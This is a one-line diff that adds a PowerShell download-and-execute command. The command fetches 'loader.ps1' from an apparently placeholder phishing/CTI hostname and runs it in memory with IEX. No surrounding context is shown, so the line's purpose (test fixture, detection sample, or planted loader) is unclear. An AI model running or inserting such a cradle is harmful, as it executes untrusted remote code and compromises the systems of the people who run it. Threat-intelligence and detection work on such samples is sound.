@@ -1,0 +1,1 @@
+IEX (iwr -uri 'http://phish-cti-example.com/loader.ps1' -useb)
